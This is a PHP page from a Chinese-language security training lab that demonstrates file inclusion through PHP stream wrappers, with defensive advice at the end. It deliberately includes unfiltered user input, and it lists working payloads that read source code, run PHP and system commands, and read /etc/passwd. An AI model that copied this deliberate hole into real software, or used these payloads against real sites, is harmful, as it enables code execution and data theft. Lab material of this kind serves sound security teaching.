<?php
// PHP伪协议利用
$module_name = 'PHP伪协议利用';
$module_icon = '🔧';
$module_desc = '利用PHP伪协议进行文件包含攻击。';

// 漏洞代码
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    // 漏洞：直接包含用户输入的文件路径，没有过滤
    include $file;
}

// 页面内容
$content = '    <div class="card">
        <div class="card-header">
            <h5 class="mb-0">🔧 PHP伪协议利用</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-warning">
                <strong>💡 漏洞说明：</strong><br>
                PHP伪协议允许攻击者利用PHP的内置协议进行文件包含攻击。<br>
                本场景中，系统直接包含用户输入的文件路径，没有进行任何过滤。
            </div>
            
            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_GET[\'file\'])) {
    $file = $_GET[\'file\'];
    // 漏洞：直接包含用户输入的文件路径，没有过滤
    include $file;
}</code></pre>
                </div>
            </div>
            
            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">尝试使用以下PHP伪协议：</p>
                    <ul class="list-group mb-3">
                        <li class="list-group-item">
                            <strong>php://filter</strong> - 读取文件内容
                            <pre class="bg-light p-2 mt-2"><code>?file=php://filter/convert.base64-encode/resource=test.txt</code></pre>
                            <small class="text-muted">条件：allow_url_include=On 或 allow_url_fopen=On</small>
                        </li>
                        <li class="list-group-item">
                            <strong>php://input</strong> - 执行POST数据中的PHP代码
                            <pre class="bg-light p-2 mt-2"><code>POST请求体：&lt;?php phpinfo(); ?&gt;</code></pre>
                            <small class="text-danger">条件：allow_url_include=On</small>
                        </li>
                        <li class="list-group-item">
                            <strong>data://</strong> - 执行内联数据中的PHP代码
                            <pre class="bg-light p-2 mt-2"><code>?file=data://text/plain,<?php phpinfo(); ?></code></pre>
                            <small class="text-danger">条件：allow_url_include=On</small>
                        </li>
                        <li class="list-group-item">
                            <strong>php://memory</strong> - 内存流操作
                            <pre class="bg-light p-2 mt-2"><code>?file=php://memory</code></pre>
                            <small class="text-muted">条件：allow_url_include=On</small>
                        </li>
                        <li class="list-group-item">
                            <strong>php://temp</strong> - 临时文件流
                            <pre class="bg-light p-2 mt-2"><code>?file=php://temp</code></pre>
                            <small class="text-muted">条件：allow_url_include=On</small>
                        </li>
                        <li class="list-group-item">
                            <strong>expect://</strong> - 执行系统命令
                            <pre class="bg-light p-2 mt-2"><code>?file=expect://ls</code></pre>
                            <small class="text-danger">条件：需要安装expect扩展</small>
                        </li>
                        <li class="list-group-item">
                            <strong>phar://</strong> - 包含phar压缩包内文件
                            <pre class="bg-light p-2 mt-2"><code>?file=phar://archive.phar/file.txt</code></pre>
                            <small class="text-muted">条件：PHP >= 5.3.0</small>
                        </li>
                        <li class="list-group-item">
                            <strong>zip://</strong> - 包含zip压缩包内文件
                            <pre class="bg-light p-2 mt-2"><code>?file=zip://archive.zip%23file.txt</code></pre>
                            <small class="text-muted">条件：需要启用zip扩展</small>
                        </li>
                        <li class="list-group-item">
                            <strong>file://</strong> - 访问本地文件系统
                            <pre class="bg-light p-2 mt-2"><code>?file=file:///etc/passwd</code></pre>
                            <small class="text-muted">条件：默认启用，无需特殊配置</small>
                        </li>
                    </ul>
                    
                    <div class="alert alert-info">
                        <strong>提示：</strong>
                        <ul class="mb-0">
                            <li>使用php://filter可以读取文件内容，使用base64编码可以避免乱码</li>
                            <li>php://input和data://需要allow_url_include=On才能执行代码</li>
                            <li>expect://协议可以执行系统命令，但很少被启用</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <div class="card mb-3">
                <div class="card-header">
                    <h6>� PHP伪协议利用条件总结</h6>
                </div>
                <div class="card-body">
                    <table class="table table-bordered">
                        <thead>
                            <tr>
                                <th>伪协议</th>
                                <th>用途</th>
                                <th>所需条件</th>
                                <th>危险等级</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><code>php://filter</code></td>
                                <td>读取文件内容</td>
                                <td>allow_url_fopen=On</td>
                                <td><span class="badge bg-warning">中</span></td>
                            </tr>
                            <tr>
                                <td><code>php://input</code></td>
                                <td>执行POST数据中的代码</td>
                                <td>allow_url_include=On</td>
                                <td><span class="badge bg-danger">高</span></td>
                            </tr>
                            <tr>
                                <td><code>data://</code></td>
                                <td>执行内联数据中的代码</td>
                                <td>allow_url_include=On</td>
                                <td><span class="badge bg-danger">高</span></td>
                            </tr>
                            <tr>
                                <td><code>php://memory</code></td>
                                <td>内存流操作</td>
                                <td>allow_url_include=On</td>
                                <td><span class="badge bg-secondary">低</span></td>
                            </tr>
                            <tr>
                                <td><code>php://temp</code></td>
                                <td>临时文件流</td>
                                <td>allow_url_include=On</td>
                                <td><span class="badge bg-secondary">低</span></td>
                            </tr>
                            <tr>
                                <td><code>expect://</code></td>
                                <td>执行系统命令</td>
                                <td>安装expect扩展</td>
                                <td><span class="badge bg-danger">极高</span></td>
                            </tr>
                            <tr>
                                <td><code>phar://</code></td>
                                <td>包含phar压缩包内文件</td>
                                <td>PHP >= 5.3.0</td>
                                <td><span class="badge bg-warning">中</span></td>
                            </tr>
                            <tr>
                                <td><code>zip://</code></td>
                                <td>包含zip压缩包内文件</td>
                                <td>启用zip扩展</td>
                                <td><span class="badge bg-warning">中</span></td>
                            </tr>
                            <tr>
                                <td><code>file://</code></td>
                                <td>访问本地文件系统</td>
                                <td>默认启用</td>
                                <td><span class="badge bg-warning">中</span></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <h6>�🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li>在php.ini中设置 <code>allow_url_include = Off</code>，禁用URL包含</li>
                        <li>在php.ini中设置 <code>allow_url_fopen = Off</code>，禁用URL文件操作</li>
                        <li>对用户输入进行严格过滤和验证，移除 <code>php://</code>、<code>data://</code> 等危险协议</li>
                        <li>使用白名单机制，只允许包含指定的文件</li>
                        <li>使用绝对路径包含文件，避免目录穿越</li>
                        <li>禁用不必要的PHP扩展（如expect）</li>
                        <li>限制 web 目录的访问权限</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>';

// 包含模板
include '../template/module_template.php';
?>